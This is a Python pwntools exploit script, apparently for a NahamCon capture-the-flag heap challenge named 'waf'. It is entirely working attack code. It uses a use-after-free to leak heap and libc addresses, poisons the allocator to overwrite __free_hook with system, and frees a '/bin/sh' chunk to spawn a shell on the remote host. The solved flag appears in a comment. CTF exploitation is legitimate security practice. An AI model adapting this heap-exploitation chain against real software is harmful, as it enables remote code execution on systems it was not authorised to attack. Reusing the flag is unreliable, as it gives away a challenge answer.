#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./waf")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

sshc = None
r = None
nc = "nc challenge.nahamcon.com 32546"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.1

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def createConfig(id, size, rule, active):
    sendl("1")
    sendl(id)
    sendl(size)
    if len(rule) == size:
        send(rule)
    else:
        sendl(rule)
    if active:
        sendl("y")
    else:
        sendl("n")
    return


def editConfig(idx, id, size, rule, active):
    sendl("2")
    sendl(idx)
    sendl(id)
    sendl(size)
    sendl(rule)
    if active:
        sendl("y")
    else:
        sendl("n")
    return


def printConfig(idx):
    sendl(3)
    sendl(idx)
    r.recvuntil(b"ID: ")
    Id = r.readline().strip()
    r.recvuntil(b"Setting: ")
    rule = r.readline().strip()
    r.recvuntil(b"s active: ")
    active = r.readline().strip()
    return Id, rule, active


def removeLast():
    sendl(4)
    r.recvuntil(b">")


def showAll():
    sendl(5)
    r.recvuntil(b">")


def main():
    global r
    r = conn()
    
    createConfig(1, 16, "a"*15, True)
    
    #editConfig(0, 1, 16, "b"*15, False)
    
    #print(printConfig(0))
    
    removeLast()
    
    leak = printConfig(0)
    log("Leak", leak)
    heapLeak = int(leak[0])
    
    logh("Heap leak", heapLeak)
    
    stdin = 0x602020+1 # first byte is null
    editConfig(0, heapLeak-0x20, 16, p8(0x2), True)
    
    #pause()
    createConfig(0, 16, p64(0xdeadbeef)+p64(stdin), True)
    
    leakLibc = u64((b"\0" + printConfig(0)[1]).ljust(8, b"\0"))
    logh("Libc leak", leakLibc)
    
    libc_base = leakLibc - 0x3eba00
    free_hook = libc_base + libc.symbols.__free_hook
    system = libc_base + libc.symbols.system
    logh("Libc base", libc_base)
    logh("Free hook", free_hook)
    
    # 
    
    createConfig(0, 16, "a", True)
    createConfig(0, 32, "b"*31, True)
    
    removeLast()
    
    editConfig(2, heapLeak+0x80, 16, p64(0x100)+p64(0), True)
    
    createConfig(0, 32, p64(free_hook), False)
    
    createConfig(0, 16, p64(system), False) # Our free hook :)
    
    createConfig(0, 16, "/bin/sh", False) 
    removeLast()
    

    r.interactive() # flag{dc75c408f5ba2fbc72b307987dddc775}


if __name__ == "__main__":
    main()

